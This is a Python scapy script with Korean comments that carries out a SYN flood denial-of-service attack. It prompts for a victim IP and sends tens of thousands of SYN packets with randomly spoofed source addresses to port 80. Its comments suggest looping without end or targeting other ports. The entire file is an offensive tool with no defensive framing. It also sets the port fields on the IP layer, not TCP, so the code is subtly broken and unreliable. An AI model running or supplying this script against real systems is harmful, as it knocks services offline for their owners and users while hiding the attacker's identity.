from scapy.all import *
import random

# 공격 대상 정보 클래스
class vic_dev():
    def __init__(self, ip_addr):
        self.ip_addr = ip_addr

# 배너를 보여주는 함수
def show_banner():
    print("<< SYN FLOOD ATTACK >>")
    
    print()
    print("[*] Interface : {}".format(conf.iface)) 

# 공격 대상의 IP 정보를 입력받는 함수
def set_victim_ip():
    print()
    print("[*] Enter Victim IP Address")
    victim = vic_dev(input("> "))
    return victim

# Syn Flood 공격 함수
def run_attack(victim):
    # 웹 포트 80, 열려있는 다른 TCP 포트로 설정해도 됨. 
    port = 80

    # 횟수를 99999 반복. 이 부분을 while 문으로 돌려서 공격해도 됨.
    for x in range(0, 99999):
        packetIP = IP()
        # IP 스푸핑, 공격자 IP 주소를 랜덤하게 설정
        packetIP.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
        packetIP.dst = victim.ip_addr
        packetTCP = TCP()
        packetIP.sport = RandShort()
        packetIP.dport = port
        # TCP 패킷을 SYN 패킷으로 설정
        packetTCP.flags = 'S'

       # 더미 데이터 (없어도 됨.)
        raw = Raw(b"N"*1024)
        packet = packetIP/packetTCP/raw

        send(packet, verbose=0)
        print("send packet {}".format(str(x)))

# 메인 함수
def main():
    show_banner()
    victim = set_victim_ip()
    print("Attack {} ...".format(victim.ip_addr))
    run_attack(victim)

if __name__ =='__main__':
    main()